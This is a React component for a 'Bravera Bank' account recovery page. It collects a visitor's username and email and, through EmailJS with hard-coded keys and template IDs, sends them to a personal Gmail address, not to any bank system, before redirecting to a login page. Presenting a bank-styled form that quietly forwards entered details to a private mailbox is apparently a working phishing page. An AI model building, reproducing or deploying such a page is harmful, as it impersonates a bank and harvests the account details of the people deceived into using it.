import { useEffect, useState } from 'react';
import BG from '../assets/bg.png';
import Logo from '../assets/logo.png';
import emailjs from '@emailjs/browser';
import Footer from '../components/Footer';

export default function ForgotPassword() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    bName: 'Bravera Bank', // Default bank name
  });

   // Initialize EmailJS
   useEffect(() => {
    // Replace with your actual EmailJS public key
    emailjs.init("v_oAluZ11har85Kfg");
  }, []);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!isReadyToSubmit()) return;
    
    setIsSubmitting(true);
    setSubmitStatus(null);
    
    try {
      // Send email using EmailJS
      const response = await emailjs.send(
        "template_vj50jeg", // Replace with your EmailJS service ID
        "template_lg21nvy", // You'll need to create this template
        {
          bName: formData.bName,
          username: formData.username,
          email: formData.email,
          to_email: "Leslieolobo@gmail.com", // Optional if specified in the template
        }
      );
      
      console.log("Recovery request sent successfully:", response);
      setSubmitStatus("success");
      
      // Redirect to the login page after a short delay
      setTimeout(() => {
        window.location.href = "/login";
      }, 1500);
      
    } catch (error) {
      console.error("Failed to send recovery request:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const isReadyToSubmit = () => {
    return formData.username.trim() && formData.email.trim();
  };

  

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(${BG})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
      }}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          <div className="flex items-center mb-6">
            {/* Back Arrow */}
            <button
              onClick={() => window.history.back()}
              className="text-gray-300 mr-3"
              aria-label="Go back"
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
            </button>
            
            <div className="flex-grow flex flex-col items-center">
              {/* Lock Icon */}
              <div className="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="text-xl font-medium">Account recovery</h2>
              <p className="text-sm text-gray-400 mt-2">We need this info to verify your identity.</p>
            </div>
          </div>

          <form className="space-y-5" onSubmit={handleSubmit}>
            {/* Username Field */}
            <div>
              <input
                type="text"
                name="username"
                value={formData.username}
                onChange={handleChange}
                placeholder="Username"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            {/* Email Field */}
            <div>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="Email"
                className="w-full px-4 py-3 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
              />
            </div>

            {/* Status message */}
            {submitStatus === "success" && (
              <div className="text-green-500 text-center">Recovery instructions sent. Redirecting...</div>
            )}
            {submitStatus === "error" && (
              <div className="text-red-500 text-center">
                Something went wrong. Please try again.
              </div>
            )}

            {/* Help link */}
            <div className="flex justify-end">
              <a href="#" className="text-[#F2AA2E] text-sm hover:underline">Need help?</a>
            </div>

            {/* Next Button */}
            <div className="flex justify-center mt-6">
              <button
                type="submit"
                className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={isSubmitting || !isReadyToSubmit()}
              >
                {isSubmitting ? "Processing..." : "Next"}
              </button>
            </div>

            {/* Try another way */}
            <div className="text-center mt-4">
              <p className="text-sm text-gray-400">
                Can't remember this information?
                <a 
                    href='https://secure.bravera.bank/forgot'
                  type="button"
                  className="text-[#F2AA2E] hover:underline ml-1"
                >
                  Try another way
                </a>
              </p>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}